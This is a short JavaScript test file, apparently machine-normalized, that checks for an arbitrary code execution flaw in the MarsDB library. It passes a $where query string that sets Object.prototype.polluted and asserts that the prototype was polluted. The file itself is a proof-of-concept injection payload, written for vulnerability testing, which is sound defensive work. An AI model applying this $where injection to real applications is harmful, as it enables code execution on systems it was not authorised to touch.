const v41 = () => {
    const v22 = expect.assertions(2);
    v22;
    const v23 = require('marsdb');
    let Collection = v23.Collection;
    const v24 = {};
    const v25 = v24.polluted;
    const v26 = expect(v25);
    const v27 = v26.toBe(undefined);
    v27;
    const v28 = { inMemory: true };
    const posts = new Collection('posts', v28);
    const v29 = { text: 'MarsDB is awesome' };
    const v30 = posts.insert(v29);
    const v39 = docId => {
        const v31 = { $where: '(Object.prototype.polluted=`yes`)' };
        const v32 = posts.find(v31);
        const v37 = docs => {
            const v33 = {};
            const v34 = v33.polluted;
            const v35 = expect(v34);
            const v36 = v35.toBe('yes');
            v36;
        };
        const v38 = v32.then(v37);
        return v38;
    };
    const v40 = v30.then(v39);
    return v40;
};
const v42 = test('Arbitrary code execution in marsdb', v41);
v42;